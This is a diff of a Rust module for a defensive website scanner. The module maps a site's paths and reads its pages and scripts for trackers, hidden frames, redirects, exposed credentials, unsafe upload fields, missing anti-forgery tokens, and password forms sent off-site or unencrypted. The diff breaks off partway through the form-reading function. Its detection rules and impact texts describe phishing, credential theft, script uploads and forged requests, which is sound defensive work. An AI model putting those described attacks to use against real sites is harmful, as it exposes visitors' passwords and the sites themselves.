@@ -1,19 +1,21 @@
 //! A website on an HTTP service: its paths, mapped from `robots.txt`, its
-//! sitemaps and its own links, and what its pages would do in a visitor's
-//! browser, read from each page and every script it loads.
+//! sitemaps and its own links, and what its code does and gives away, read
+//! from each page, every script it loads and whatever else it serves.
 //!
 //! Nothing is run. Pages and scripts are fetched with plain `GET`s inside the
-//! scanner and their source is read for code that reaches into the browser:
-//! location, the visitor's IP address, device fingerprinting, camera and
-//! sensors, keystrokes, crypto mining, hidden frames, password forms that
-//! post elsewhere, redirects, trackers and session recorders. Code that only
-//! builds these calls as it runs can slip past a reading.
+//! scanner and their source is read for code that reaches into a visitor's
+//! browser (location, the visitor's IP address, device fingerprinting,
+//! camera and sensors, keystrokes, crypto mining, hidden frames, redirects,
+//! trackers and session recorders) and for what the site itself exposes: its
+//! forms (where each submits, file uploads, credentials in the markup,
+//! passwords sent in the address or in the clear, posts with no anti-forgery
+//! token), credentials left in its own code, the requests that code makes,
+//! PHP source and source maps it serves, what its `robots.txt` points to, and
+//! on WordPress, what that gives away. Code that only builds these calls as
+//! it runs can slip past a reading.
 //!
-//! What the site itself exposes is read too: its forms (file uploads,
-//! credentials in the markup, passwords sent in the address or in the clear,
-//! posts with no anti-forgery token), credentials left in its own code, the
-//! requests that code makes, PHP source and source maps it serves, what its
-//! `robots.txt` points to, and on WordPress, what that gives away.
+//! Every concern names the file it's in, and the report re-prints the part
+//! of that file it's in (see [`source`]).
 
 use std::collections::{HashSet, VecDeque};
 
@@ -21,6 +23,7 @@ use futures::future::join_all;
 use reqwest::{Client, Url};
 use serde::Serialize;
 
+use crate::source::{self, Mark, SourceFile};
 use crate::{code, wordpress, Baseline};
 
 /// Pages fetched per site, at most.
@@ -35,6 +38,8 @@ const MOST_SITEMAPS: usize = 5;
 const BIGGEST: usize = 3 * 1024 * 1024;
 /// Requests in flight at once.
 const AT_ONCE: usize = 8;
+/// Files kept to show in the report, at most.
+const MOST_FILES: usize = 80;
 
 /// Paths not worth fetching as pages: images, styles, fonts, media, archives.
 const ASSETS: &[&str] = &[
@@ -66,16 +71,25 @@ pub struct Script {
     pub bytes: usize,
 }
 
-/// Something a page would do in a visitor's browser.
-#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
+/// What a concern means, and what could happen because of it.
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+pub struct Says {
+    pub why: &'static str,
+    pub impact: &'static str,
+}
+
+/// Something the site's code does or gives away.
+#[derive(Debug, Clone, Default, PartialEq, Eq, Serialize)]
 pub struct Signal {
-    /// Location, Network, Fingerprinting, ...
+    /// Forms, Secrets, Location, Fingerprinting, ...
     pub category: &'static str,
     pub label: String,
-    /// `high`, `medium` or `low`.
+    /// `high`, `medium`, `low`, or `info` for a form with nothing wrong.
     pub severity: &'static str,
-    /// What it means for someone who opens the page.
+    /// What it is.
     pub why: &'static str,
+    /// What could happen because of it.
+    pub impact: &'static str,
     /// The code or markup that showed it.
     pub evidence: String,
     /// The page it was on.
@@ -83,6 +97,31 @@ pub struct Signal {
     /// The script it was in; `None` for the page's own markup or inline code.
     #[serde(skip_serializing_if = "Option::is_none")]
     pub script: Option<String>,
+    /// The file it's in: the `url` of one of the site's `files`.
+    #[serde(skip_serializing_if = "Option::is_none")]
+    pub file: Option<String>,
+    /// Where in that file's shown text.
+    #[serde(skip_serializing_if = "Option::is_none")]
+    pub mark: Option<Mark>,
+    /// For one thing with several problems, such as a form, each of them.
+    #[serde(skip_serializing_if = "Vec::is_empty")]
+    pub issues: Vec<Issue>,
+    /// Its byte range in the file's text, until the file is shown.
+    #[serde(skip)]
+    pub span: Option<(usize, usize)>,
+}
+
+/// One problem with something that has several.
+#[derive(Debug, Clone, Default, PartialEq, Eq, Serialize)]
+pub struct Issue {
+    pub label: String,
+    pub severity: &'static str,
+    pub why: &'static str,
+    pub impact: &'static str,
+    #[serde(skip_serializing_if = "Option::is_none")]
+    pub mark: Option<Mark>,
+    #[serde(skip)]
+    pub span: Option<(usize, usize)>,
 }
 
 /// A request the site makes: from a form, its own code, or the parameters
@@ -119,9 +158,24 @@ pub struct Site {
     /// The requests its forms and its own code make.
     #[serde(skip_serializing_if = "Vec::is_empty")]
     pub requests: Vec<Request>,
+    /// The files its signals are in, as the report shows them.
+    #[serde(skip_serializing_if = "Vec::is_empty")]
+    pub files: Vec<SourceFile>,
     /// Whether it runs WordPress.
     #[serde(skip)]
     pub wordpress: bool,
+    /// The text of each file a signal was found in, until it's shown.
+    #[serde(skip)]
+    texts: Vec<Text>,
+}
+
+/// A file's whole text, kept until the report shows the part it needs.
+#[derive(Debug, Clone, PartialEq, Eq)]
+struct Text {
+    url: String,
+    name: String,
+    kind: &'static str,
+    text: String,
 }
 
 /// Links kept per site, at most.
@@ -130,6 +184,125 @@ const MOST_LINKS: usize = 300;
 const MOST_REQUESTS: usize = 300;
 /// Source maps read per site, at most.
 const MOST_MAPS: usize = 10;
+
+/// Where code being read sits: the page it's on, the script it's in, the
+/// file it's shown as, and where in that file it starts.
+#[derive(Debug, Clone, Copy)]
+struct Loc<'a> {
+    page: &'a str,
+    script: Option<&'a str>,
+    file: &'a str,
+    base: usize,
+}
+
+impl<'a> Loc<'a> {
+    fn new(page: &'a str, script: Option<&'a str>, file: &'a str) -> Self {
+        Loc {
+            page,
+            script,
+            file,
+            base: 0,
+        }
+    }
+
+    /// The same place, for code starting `by` bytes further into the file.
+    fn shift(self, by: usize) -> Self {
+        Loc {
+            base: self.base + by,
+            ..self
+        }
+    }
+
+    /// A signal at byte range `span` of the code being read.
+    fn signal(
+        &self,
+        category: &'static str,
+        label: impl Into<String>,
+        severity: &'static str,
+        says: Says,
+        evidence: String,
+        span: (usize, usize),
+    ) -> Signal {
+        Signal {
+            category,
+            label: label.into(),
+            severity,
+            why: says.why,
+            impact: says.impact,
+            evidence,
+            page: self.page.to_string(),
+            script: self.script.map(str::to_string),
+            file: Some(self.file.to_string()),
+            span: Some((self.base + span.0, self.base + span.1)),
+            ..Signal::default()
+        }
+    }
+}
+
+/// Where `part`, a slice of `whole`, starts in it.
+fn offset(whole: &str, part: &str) -> usize {
+    part.as_ptr() as usize - whole.as_ptr() as usize
+}
+
+/// A file's path as the explorer shows it: on this site its path, with
+/// `index.html` for a directory, and elsewhere with the host first.
+fn file_name(root: &Url, url: &Url) -> String {
+    let path = url.path();
+    let path = if path.ends_with('/') {
+        format!("{path}index.html")
+    } else {
+        path.to_string()
+    };
+    if same_origin(root, url) {
+        path
+    } else {
+        format!("{}{path}", url.host_str().unwrap_or(""))
+    }
+}
+
+/// The language of a file by its name, else `default`.
+fn kind_of(name: &str, default: &'static str) -> &'static str {
+    let lower = name.to_ascii_lowercase();
+    let ext = lower.rsplit_once('.').map_or("", |(_, e)| e);
+    match ext {
+        "js" | "mjs" | "cjs" | "jsx" | "ts" | "tsx" | "vue" | "svelte" => "js",
+        "php" | "phtml" => "php",
+        "css" | "scss" | "less" => "css",
+        "json" | "map" => "json",
+        "html" | "htm" => "html",
+        "xml" => "xml",
+        "txt" | "log" => "text",
+        _ => default,
+    }
+}
+
+/// Adds signals found in a file, keeping the file's text to show when
+/// there are any.
+fn add(
+    site: &mut Site,
+    signals: Vec<Signal>,
+    url: &str,
+    name: String,
+    kind: &'static str,
+    text: &str,
+) {
+    if signals.is_empty() {
+        return;
+    }
+    keep(site, url, name, kind, text);
+    site.signals.extend(signals);
+}
+
+fn keep(site: &mut Site, url: &str, name: String, kind: &'static str, text: &str) {
+    if site.texts.len() < MOST_FILES && !site.texts.iter().any(|t| t.url == url) {
+        site.texts.push(Text {
+            url: url.to_string(),
+            name,
+            kind,
+            text: text.to_string(),
+        });
+    }
+}
 
 /// Keeps `url` among the site's links when it's on another host.
 fn link_out(site: &mut Site, root: &Url, url: Url) {
@@ -170,6 +343,15 @@ fn addresses(code: &str) -> Vec<&str> {
     out
 }
 
+/// A source map a script named, to read after the scripts.
+struct MapRef {
+    map: Url,
+    script: String,
+    page: String,
+    /// Where the script names it.
+    span: (usize, usize),
+}
+
 /// Maps and reads the site at `base`, starting from `/` and `start` (such
 /// as a URL's own path). `soft404` is how the service answers a path that
 /// can't exist, when it answers every path.
@@ -193,7 +375,10 @@ pub async fn explore(
         enqueue(&mut seen, &mut queue, path.clone(), 0, "url");
     }
     let robots = from_robots_and_sitemaps(client, &root, &mut seen, &mut queue).await;
-    site.wordpress = robots.iter().any(|(path, _)| path.starts_with("/wp-admin"));
+    site.wordpress = robots
+        .named
+        .iter()
+        .any(|(path, _)| path.starts_with("/wp-admin"));
 
     let mut scripts: Vec<String> = Vec::new();
     crawl(
@@ -211,37 +396,70 @@ pub async fn explore(
     // own scripts also name its routes, which a single-page app never links
     // in its markup.
     scripts.truncate(MOST_SCRIPTS);
-    let mut maps: Vec<(Url, String, String)> = Vec::new();
+    let mut maps: Vec<MapRef> = Vec::new();
     for chunk in scripts.chunks(AT_ONCE) {
         let bodies = join_all(chunk.iter().map(|u| body(client, u))).await;
         for (url, code) in chunk.iter().zip(bodies) {
-            let third_party = Url::parse(url).map_or(true, |u| !same_origin(&root, &u));
+            let parsed = Url::parse(url).ok();
+            let third_party = parsed.as_ref().map_or(true, |u| !same_origin(&root, u));
             site.scripts.push(Script {
                 url: url.clone(),
                 third_party,
                 bytes: code.as_ref().map_or(0, String::len),
             });
+            let Some(code) = code else { continue };
             let page = first_page_with(&site, url);
-            trackers(url, &page, Some(url), &mut site.signals);
-            if let Some(code) = code {
-                read_code(&code, &page, Some(url), &mut site.signals);
-                if !third_party {
-                    for route in routes(&code) {
-                        enqueue(&mut seen, &mut queue, route, DEEPEST, "script");
+            let at = Loc::new(&page, Some(url), url);
+            let mut found = read_code(&code, at);
+            let mut named_map = false;
+            if !third_party {
+                for route in routes(&code) {
+                    enqueue(&mut seen, &mut queue, route, DEEPEST, "script");
+                }
+                for address in addresses(&code) {
+                    if let Ok(u) = Url::parse(address) {
+                        link_out(&mut site, &root, u);
                     }
-                    for address in addresses(&code) {
-                        if let Ok(u) = Url::parse(address) {
-                            link_out(&mut site, &root, u);
-                        }
-                    }
-                    own_code(&mut site, &root, &code, &page, Some(url));
-                    if let Some(map) = source_map(&root, url, &code, &page, &mut site.signals) {
-                        if maps.len() < MOST_MAPS && !maps.iter().any(|(m, _, _)| *m == map) {
-                            maps.push((map, url.clone(), page));
+                }
+                found.extend(own_code(&mut site.requests, &root, &code, at));
+                if let Some((span, name)) = source_map(&code) {
+                    if name.starts_with("data:") {
+                        found.push(at.signal(
+                            "Source",
+                            "Ships its source code",
+                            "medium",
+                            SOURCE,
+                            format!(
+                                "sourceMappingURL={}...",
+                                name.chars().take(40).collect::<String>()
+                            ),
+                            span,
+                        ));
+                    } else if let Some(map) = Url::parse(url)
+                        .ok()
+                        .and_then(|u| u.join(name).ok())
+                        .filter(|m| same_origin(&root, m))
+                    {
+                        if maps.len() < MOST_MAPS && !maps.iter().any(|m| m.map == map) {
+                            named_map = true;
+                            maps.push(MapRef {
+                                map,
+                                script: url.clone(),
+                                page: page.clone(),
+                                span,
+                            });
                         }
                     }
                 }
             }
+            let name = parsed
+                .as_ref()
+                .map_or_else(|| url.clone(), |u| file_name(&root, u));
+            let kind = kind_of(&name, "js");
+            if named_map {
+                keep(&mut site, url, name.clone(), kind, &code);
+            }
+            add(&mut site, found, url, name, kind, &code);
         }
     }
     read_maps(client, &root, &mut site, &maps).await;
@@ -258,9 +476,18 @@ pub async fn explore(
     robots_signals(client, &root, &mut site, &robots, soft404).await;
     php_source(client, &root, &mut site).await;
     if site.wordpress {
-        site.signals.extend(wordpress::check(client, &root).await);
+        for (signal, path, text, kind) in wordpress::check(client, &root).await {
+            let Ok(u) = root.join(&path) else { continue };
+            let url = u.to_string();
+            let signal = Signal {
+                file: Some(url.clone()),
+                ..signal
+            };
+            add(&mut site, vec![signal], &url, path, kind, &text);
+        }
     }
     dedupe(&mut site.signals);
+    place(&mut site);
     site
 }
 
@@ -290,24 +517,14 @@ async fn crawl(
                 content_type: got.content_type.clone(),
                 found,
             });
-            if let Some(to) = got.location.as_deref().and_then(|l| got.url.join(l).ok()) {
-                if !same_site(root, &to) && (300..400).contains(&got.status) {
-                    site.signals.push(Signal {
-                        category: "Redirects and frames",
-                        label: format!("Redirects to {}", to.host_str().unwrap_or("another site")),
-                        severity: "medium",
-                        why: "Opening this path sends you on to a different site.",
-                        evidence: format!("{} to {to}", got.status),
-                        page: path.clone(),
-                        script: None,
-                    });
-                }
+            if let Some(location) = got.location.as_deref() {
+                redirect(site, root, &got, &path, location);
             }
-            let Some(html) = got.html.filter(|_| read) else {
+            let Some(html) = got.html.as_deref().filter(|_| read) else {
                 continue;
             };
-            read_page(site, root, &got.url, &path, &html, scripts);
-            for link in values(&html, "a", "href") {
+            read_page(site, root, &got.url, &path, html, scripts);
+            for link in values(html, "a", "href") {
                 match local_path(root, &got.url, link) {
                     Some(next) if depth < DEEPEST => enqueue(seen, queue, next, depth + 1, "link"),
                     Some(_) => {}
@@ -320,6 +537,40 @@ async fn crawl(
             }
         }
     }
+}
+
+const LEAVES: Says = Says {
+    why: "Opening this path sends you on to a different site.",
+    impact: "Visitors land on a site this one doesn't control. If that site is compromised, or the redirect was planted, it's a ready-made route to phishing or malware.",
+};
+
+/// A path that redirects to another site, shown as the answer it gave.
+fn redirect(site: &mut Site, root: &Url, got: &Got, path: &str, location: &str) {
+    let Some(to) = got.url.join(location).ok() else {
+        return;
+    };
+    if same_site(root, &to) || !(300..400).contains(&got.status) {
+        return;
+    }
+    let head = format!("HTTP {}\nLocation: ", got.status);
+    let text = format!("{head}{location}\n");
+    let url = got.url.to_string();
+    let signal = Loc::new(path, None, &url).signal(
+        "Redirects and frames",
+        format!("Redirects to {}", to.host_str().unwrap_or("another site")),
+        "medium",
+        LEAVES,
+        format!("{} to {to}", got.status),
+        (head.len(), head.len() + location.len()),
+    );
+    add(
+        site,
+        vec![signal],
+        &url,
+        file_name(root, &got.url),
+        "http",
+        &text,
+    );
 }
 
 /// Paths a script names as string literals, `"/docs/install"`: the routes a
@@ -381,19 +632,25 @@ fn enqueue(
     }
 }
 
+/// What `robots.txt` said: its text, and each path it names with its line.
+#[derive(Default)]
+struct Robots {
+    text: String,
+    named: Vec<(String, String)>,
+}
+
 /// Paths `robots.txt` names (disallowed ones too: they are often what a site
-/// would rather not list) and the pages in the site's sitemaps. Returns
-/// each path `robots.txt` names, with its line.
+/// would rather not list) and the pages in the site's sitemaps.
 async fn from_robots_and_sitemaps(
     client: &Client,
     root: &Url,
     seen: &mut HashSet<String>,
     queue: &mut VecDeque<(String, usize, &'static str)>,
-) -> Vec<(String, String)> {
-    let mut named = Vec::new();
+) -> Robots {
+    let mut robots = Robots::default();
     let mut sitemaps: Vec<Url> = root.join("/sitemap.xml").into_iter().collect();
-    if let Some(robots) = root.join("/robots.txt").ok().map(|u| u.to_string()) {
-        if let Some(text) = body(client, &robots).await {
+    if let Some(url) = root.join("/robots.txt").ok().map(|u| u.to_string()) {
+        if let Some(text) = body(client, &url).await {
             for line in text.lines() {
                 let Some((key, value)) = line.split_once(':') else {
                     continue;
@@ -402,8 +659,8 @@ async fn from_robots_and_sitemaps(
                 match key.trim().to_ascii_lowercase().as_str() {
                     "disallow" | "allow" if value.starts_with('/') && !value.contains('*') => {
                         let path = value.trim_end_matches('$').to_string();
-                        if named.len() < 200 {
-                            named.push((path.clone(), line.trim().to_string()));
+                        if robots.named.len() < 200 {
+                            robots.named.push((path.clone(), line.trim().to_string()));
                         }
                         enqueue(seen, queue, path, DEEPEST, "robots");
                     }
@@ -417,6 +674,7 @@ async fn from_robots_and_sitemaps(
                     _ => {}
                 }
             }
+            robots.text = text;
         }
     }
     let mut read = 0;
@@ -443,7 +701,7 @@ async fn from_robots_and_sitemaps(
             }
         }
     }
-    named
+    robots
 }
 
 /// A fetched path.
@@ -536,8 +794,21 @@ fn first_page_with(site: &Site, url: &str) -> String {
         .map_or_else(|| "/".to_string(), |s| s.page.clone())
 }
 
-/// Reads one page's markup: the scripts it loads, its inline code, hidden
-/// frames, password forms and redirects.
+const HIDDEN_FRAME: Says = Says {
+    why: "An invisible frame loads another page in the background, a common way to run code or track you out of sight.",
+    impact: "The frame's page runs with nothing on screen to show it: trackers, ad fraud, or on a compromised site, a drive-by download.",
+};
+const CLEAR_PASSWORD: Says = Says {
+    why: "Anything typed into this page travels unencrypted and can be read on the way.",
+    impact: "Anyone on the same Wi-Fi or anywhere on the network path can read the password as it's sent, and sign in with it.",
+};
+const META_REDIRECT: Says = Says {
+    why: "The page sends you on to a different site as soon as it loads.",
+    impact: LEAVES.impact,
+};
+
+/// Reads one page's markup: the scripts it loads, its inline code, its
+/// forms, credentials in it, hidden frames and redirects.
 fn read_page(
     site: &mut Site,
     root: &Url,
@@ -547,42 +818,44 @@ fn read_page(
     scripts: &mut Vec<String>,
 ) {
     let lower = html.to_ascii_lowercase();
+    let file = url.to_string();
+    let at = Loc::new(path, None, &file);
+    let mut found = Vec::new();
     for (tag, inner) in elements(html, &lower, "script") {
         match value(tag, "src") {
             Some(src) => {
+                found.extend(trackers(src, at.shift(offset(html, src))));
                 if let Ok(u) = url.join(src.trim()) {
                     let u = u.to_string();
                     if !scripts.contains(&u) {
                         // Remembered so the script's findings name this page.
                         site.signals.push(Signal {
                             category: "Scripts",
-                            label: String::new(),
-                            severity: "",
-                            why: "",
                             evidence: u.clone(),
                             page: path.to_string(),
-                            script: None,
+                            ..Signal::default()
                         });
                         scripts.push(u);
                     }
                 }
             }
             None => {
-                trackers(inner, path, None, &mut site.signals);
-                read_code(inner, path, None, &mut site.signals);
-                own_code(site, root, inner, path, None);
+                let inline = at.shift(offset(html, inner));
+                found.extend(trackers(inner, inline));
+                found.extend(read_code(inner, inline));
+                found.extend(own_code(&mut site.requests, root, inner, inline));
             }
         }
     }
     // Credentials left in the markup: comments, inline data, attributes.
-    secret_signals(html, path, None, &mut site.signals);
+    found.extend(secret_signals(html, at));
     if ["/wp-content/", "/wp-includes/", "content=\"wordpress"]
         .iter()
         .any(|w| lower.contains(*w))
     {
         site.wordpress = true;
     }
-    forms(site, root, url, path, html, &lower);
+    found.extend(forms(&mut site.requests, root, url, html, &lower, at));
     for (tag, _) in elements(html, &lower, "iframe") {
         let t = tag.to_ascii_lowercase().replace(' ', "");
         let hidden = [
@@ -598,30 +871,33 @@ fn read_page(
         .iter()
         .any(|h| t.contains(*h));
         if hidden {
-            site.signals.push(Signal {
-                category: "Redirects and frames",
-                label: "Loads a hidden frame".to_string(),
-                severity: "medium",
-                why: "An invisible frame loads another page in the background, a common way to run code or track you out of sight.",
-                evidence: snippet(tag),
-                page: path.to_string(),
-                script: None,
-            });
+            let start = offset(html, tag);
+            found.push(at.signal(
+                "Redirects and frames",
+                "Loads a hidden frame",
+                "medium",
+                HIDDEN_FRAME,
+                snippet(tag),
+                (start, start + tag.len()),
+            ));
         }
     }
+    // A password field outside any form still sends what's typed into it.
     let password = ["type=\"password\"", "type='password'", "type=password"]
         .iter()
-        .any(|p| lower.contains(*p));
-    if password && root.scheme() == "http" {
-        site.signals.push(Signal {
-            category: "Forms",
-            label: "Asks for a password over plain HTTP".to_string(),
-            severity: "medium",
-            why: "Anything typed into this page travels unencrypted and can be read on the way.",
-            evidence: "<input type=\"password\">".to_string(),
-            page: path.to_string(),
-            script: None,
-        });
+        .find_map(|p| lower.find(*p).map(|i| (i, p.len())));
+    let in_form = found
+        .iter()
+        .any(|s| s.category == "Forms" && s.issues.iter().any(|i| i.label.contains("password")));
+    if let Some((i, len)) = password.filter(|_| root.scheme() == "http" && !in_form) {
+        found.push(at.signal(
+            "Forms",
+            "Asks for a password over plain HTTP",
+            "medium",
+            CLEAR_PASSWORD,
+            "<input type=\"password\">".to_string(),
+            (i, i + len),
+        ));
     }
     for (tag, _) in elements(html, &lower, "meta") {
         let refresh = value(tag, "http-equiv").is_some_and(|v| v.eq_ignore_ascii_case("refresh"));
@@ -636,42 +912,60 @@ fn read_page(
             continue;
         };
         if !same_site(root, &to) {
-            site.signals.push(Signal {
-                category: "Redirects and frames",
-                label: format!("Redirects to {}", to.host_str().unwrap_or("another site")),
-                severity: "medium",
-                why: "The page sends you on to a different site as soon as it loads.",
-                evidence: snippet(tag),
-                page: path.to_string(),
-                script: None,
-            });
+            let start = offset(html, tag);
+            found.push(at.signal(
+                "Redirects and frames",
+                format!("Redirects to {}", to.host_str().unwrap_or("another site")),
+                "medium",
+                META_REDIRECT,
+                snippet(tag),
+                (start, start + tag.len()),
+            ));
         }
     }
+    add(site, found, &file, file_name(root, url), "html", html);
 }
 
-/// A signal about the site itself.
-fn own(
-    category: &'static str,
-    label: impl Into<String>,
-    severity: &'static str,
-    why: &'static str,
-    evidence: String,
-    page: &str,
-    script: Option<&str>,
-) -> Signal {
-    Signal {
-        category,
-        label: label.into(),
-        severity,
-        why,
-        evidence,
-        page: page.to_string(),
-        script: script.map(str::to_string),
-    }
-}
-
-const ANY_UPLOAD: &str = "Nothing in the form limits what can be sent. Make sure the server caps each upload's size and checks its type, or anyone can fill its disk or memory, or upload a script it then runs.";
-const UPLOAD: &str = "Limits set in the page bind only browsers that respect them. The server has to cap each upload's size and check its type itself, or one request can fill its disk or memory.";
+const FORM: Says = Says {
+    why: "Where this form sends what's typed into it, and how.",
+    impact: "",
+};
+const FORM_ISSUES: Says = Says {
+    why: "Where this form sends what's typed into it, and what's wrong with how it does.",
+    impact: "",
+};
+const ANY_UPLOAD: Says = Says {
+    why: "Nothing in the form limits what can be sent. Make sure the server caps each upload's size and checks its type.",
+    impact: "One script can send a huge file, or thousands of them, until the server's disk or memory runs out and it goes down. If uploads land where the web server serves them, an uploaded .php or .html file runs as code on your site.",
+};
+const UPLOAD: Says = Says {
+    why: "Limits set in the page bind only browsers that respect them. The server has to cap each upload's size and check its type itself.",
+    impact: "Anyone posting to it directly skips the page's limits: a file of any size or type, as often as they like, can fill the disk or memory, or put a script on the server.",
+};
+const PASSWORD_ELSEWHERE: Says = Says {
+    why: "The page asks for a password and sends it to a different site than the one you'd be on, the shape of a phishing page.",
+    impact: "Every password typed here goes to another host. If that isn't intended, someone is collecting your users' passwords.",
+};
+const PASSWORD_CLEAR: Says = Says {
+    why: "The page is encrypted but its form posts to a plain HTTP address, so the password travels unencrypted.",
+    impact: CLEAR_PASSWORD.impact,
+};
+const PASSWORD_GET: Says = Says {
+    why: "The form submits with GET, so the password ends up in the address.",
+    impact: "The password is kept in browser history and in server, proxy and analytics logs, and can leak to other sites in the Referer header.",
+};
+const PASSWORD_FILLED: Says = Says {
+    why: "The page carries a password in its own markup.",
+    impact: "Anyone who views the page's source can read the password and sign in with it.",
+};
+const HIDDEN_CREDENTIAL: Says = Says {
+    why: "A hidden field carries what looks like a password or key. Hidden only means not drawn: it's in the page's source.",
+    impact: "Anyone who views the page's source has the key or password, and can use it directly against whatever it unlocks.",
+};
+const NO_TOKEN: Says = Says {
+    why: "Nothing in the form proves a submission came from this site, unless the server checks some other way, such as SameSite cookies.",
+    impact: "Another site can make a signed-in visitor's browser submit this form without them knowing, changing their details or acting as them.",
+};
 
 /// Names of hidden fields that carry an anti-forgery token.
 const FORGERY: &[&str] = &[
@@ -695,26 +989,38 @@ fn address(root: &Url, to: &Url) -> String {
     }
 }
 
-fn add_request(site: &mut Site, r: Request) {
-    let known = site
-        .requests
+fn add_request(requests: &mut Vec<Request>, r: Request) {
+    let known = requests
         .iter()
         .any(|x| x.method == r.method && x.url == r.url);
-    if !known && site.requests.len() < MOST_REQUESTS {
-        site.requests.push(r);
+    if !known && requests.len() < MOST_REQUESTS {
+        requests.push(r);
     }
 }
 
-/// An attribute's value in `tag` with the value masked.
-fn masked(tag: &str, v: &str) -> String {
-    let at = v.as_ptr() as usize - tag.as_ptr() as usize;
-    snippet(&code::mask(tag, at, v.len()))
+/// How bad a severity is, worst first.
+fn rank(severity: &str) -> u8 {
+    match severity {
+        "high" => 0,
+        "medium" => 1,
+        "low" => 2,
+        _ => 3,
+    }
 }
 
-/// Reads a page's forms: where each sends what it asks for and how, the
-/// files it takes and the credentials it carries. Each is listed among the
-/// site's requests too.
-fn forms(site: &mut Site, root: &Url, url: &Url, path: &str, html: &str, lower: &str) {
+/// Reads a page's forms: one concern each, naming where it submits and
+/// how, with every problem it has: what it does with passwords, the files
+/// it takes, credentials it carries, and whether it can be forged. Each is
+/// listed among the site's requests too.
+fn forms(
+    requests: &mut Vec<Request>,
+    root: &Url,
+    url: &Url,
+    html: &str,
+    lower: &str,
+    at: Loc,
+) -> Vec<Signal> {
+    let mut out = Vec::new();
     for (tag, inner) in elements(html, lower, "form") {
         let action = value(tag, "action")
             .map(str::trim)
@@ -724,6 +1030,7 @@ fn forms(site: &mut Site, root: &Url, url: &Url, path: &str, html: &str, lower: 
             .unwrap_or_else(|| url.clone());
         let stated = value(tag, "method").map(|m| m.trim().to_ascii_uppercase());
         let method = stated.clone().unwrap_or_else(|| "GET".to_string());
+        let dest = address(root, &to);
         let inner_lower = inner.to_ascii_lowercase();
         let inputs: Vec<&str> = elements(inner, &inner_lower, "input")
             .into_iter()
@@ -739,86 +1046,96 @@ fn forms(site: &mut Site, root: &Url, url: &Url, path: &str, html: &str, lower: 
             .filter(|n| !n.is_empty())
             .collect();
         add_request(
-            site,
+            requests,
             Request {
                 method: method.clone(),
-                url: address(root, &to),
+                url: dest.clone(),
                 params,
-                page: path.to_string(),
+                page: at.page.to_string(),
                 script: None,
             },
         );
 
-        let mut found = Vec::new();
-        let mut flag = |label: String, severity, why, evidence| {
-            found.push(own("Forms", label, severity, why, evidence, path, None));
+        let span = |part: &str| {
+            let s = at.base + offset(html, part);
+            Some((s, s + part.len()))
         };
-        let password = inputs.iter().any(|t| kind(t) == "password");
-        if password && !same_site(root, &to) {
-            flag(
-                format!("Sends a password to {}", to.host_str().unwrap_or("another site")),
-                "high",
-                "The page asks for a password and sends it to a different site than the one you'd be on, the shape of a phishing page.",
-                snippet(tag),
-            );
-        }
-        if password && root.scheme() == "https" && to.scheme() == "http" {
-            flag(
-                "Sends a password over plain HTTP".to_string(),
-                "medium",
-                "The page is encrypted but its form posts to a plain HTTP address, so the password travels unencrypted.",
-                snippet(tag),
-            );
-        }
-        if password && (stated.as_deref() == Some("GET") || (stated.is_none() && action.is_some()))
-        {
-            flag(
-                "Sends a password in the address".to_string(),
-                "medium",
-                "The form submits with GET, so the password ends up in the address bar, browser history and server logs.",
-                snippet(tag),
-            );
+        let mut issues = Vec::new();
+        let mut issue = |label: String, severity: &'static str, says: Says, part: &str| {
+            issues.push(Issue {
+                label,
+                severity,
+                why: says.why,
+                impact: says.impact,
+                mark: None,
+                span: span(part),
+            });
+        };
+        let password = inputs.iter().copied().find(|t| kind(t) == "password");
+        if let Some(field) = password {
+            if !same_site(root, &to) {
+                issue(
+                    format!(
+                        "Sends a password to {}",
+                        to.host_str().unwrap_or("another site")
+                    ),
+                    "high",
+                    PASSWORD_ELSEWHERE,
+                    tag,
+                );
+            }
+            if root.scheme() == "http" {
+                issue(
+                    "Asks for a password over plain HTTP".to_string(),
+                    "medium",
+                    CLEAR_PASSWORD,
+                    field,
+                );
+            } else if to.scheme() == "http" {
+                issue(
+                    "Sends a password over plain HTTP".to_string(),
+                    "medium",
+                    PASSWORD_CLEAR,
+                    tag,
+                );
+            }
+            if stated.as_deref() == Some("GET") || (stated.is_none() && action.is_some()) {
+                issue(
+                    "Sends a password in the address".to_string(),
+                    "medium",
+                    PASSWORD_GET,
+                    tag,
+                );
+            }
         }
         for t in &inputs {
             let v = value(t, "value").unwrap_or("");
             match kind(t).as_str() {
-                "password" if !v.trim().is_empty() => flag(
+                "password" if !v.trim().is_empty() => issue(
                     "Fills in a password in the page".to_string(),
                     "high",
-                    "The page carries a password in its own markup, readable by anyone who views its source.",
-                    masked(t, v),
+                    PASSWORD_FILLED,
+                    t,
                 ),
-                "hidden" if code::credential_name(&name(t)) && code::credential_value(v) => flag(
-                    "Hides a credential in a form".to_string(),
+                "hidden" if code::credential_name(&name(t)) && code::credential_value(v) => issue(
+                    format!("Hides a credential in the field {}", name(t)),
                     "high",
-                    "A hidden field carries what looks like a password or key. Hidden only means not drawn: it's in the page's source for anyone to read.",
-                    masked(t, v),
+                    HIDDEN_CREDENTIAL,
+                    t,
                 ),
                 _ => {}
             }
         }
-        let files: Vec<&str> = inputs
-            .iter()
-            .copied()
-            .filter(|t| kind(t) == "file")
-            .collect();
-        if let Some(first) = files.first() {
-            let limited = files
-                .iter()
-                .all(|t| value(t, "accept").is_some_and(|a| !a.trim().is_empty()));
+        for t in inputs.iter().copied().filter(|t| kind(t) == "file") {
+            let limited = value(t, "accept").is_some_and(|a| !a.trim().is_empty());
             if limited {
-                flag(
-                    "Takes file uploads".to_string(),
-                    "low",
-                    UPLOAD,
-                    snippet(first),
-                );
+                issue("Takes file uploads".to_string(), "low", UPLOAD, t);
             } else {
-                flag(
+                issue(
                     "Takes uploads of any file type".to_string(),
                     "medium",
                     ANY_UPLOAD,
-                    snippet(first),
+                    t,
                 );
             }
         }
@@ -827,30 +1144,50 @@ fn forms(site: &mut Site, root: &Url, url: &Url, path: &str, html: &str, lower: 
             kind(t) == "hidden" && FORGERY.iter().any(|f| n.contains(f))
         });
         if method == "POST" && same_site(root, &to) && !token {
-            flag(
+            issue(
                 "Posts without an anti-forgery token".to_string(),
                 "low",
-                "Nothing in the form proves a submission came from this site, so another site could submit it for a signed-in visitor, unless the server checks some other way, such as SameSite cookies.",
-                snippet(tag),
+                NO_TOKEN,
+                tag,
             );
         }
-        site.signals.extend(found);
+
+        issues.sort_by_key(|i| rank(i.severity));
+        let severity = issues.first().map_or("info", |i| i.severity);
